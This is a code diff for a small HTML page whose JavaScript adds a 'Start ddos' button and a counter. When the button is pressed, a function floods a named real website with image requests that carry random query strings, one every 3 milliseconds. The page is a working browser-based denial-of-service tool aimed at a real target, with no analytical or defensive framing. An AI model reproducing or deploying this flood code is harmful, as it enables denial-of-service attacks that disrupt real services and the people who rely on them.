@@ -1,14 +1,27 @@
-<button type="button" onclick=push()>Click Me!</button>
+<button type="button" onclick=push()>Start ddos</button><br>
+<input type="text" id="url_input"><br>
+<button type="button" onclick=get_text()>get</button><br>
+<button type="button" onclick=set_text()>set</button><br>
+<input type="text" id="requests_count"><br>
 
 <script type="text/javascript">
+    var requests_count = 0
+     function set_text(){
+         document.getElementById('url_input').value = 'aaaaaa'
+     }
+    function get_text(){
+        var input_value = document.getElementById('url_input').value
+        alert(input_value)
+    }
     function push() {
-    alert('aaaa');
         function imgflood() {
+            requests_count += 1
             var TARGET = 'fsb.ru'
             var URI = '/fsb/sh.htm?query='
             var pic = new Image()
             var rand = Math.floor(Math.random() * 1000)
             pic.src = 'http://' + TARGET + URI + rand
+            document.getElementById('requests_count').value = requests_count.toString()
         }
 
         setInterval(imgflood, 3)
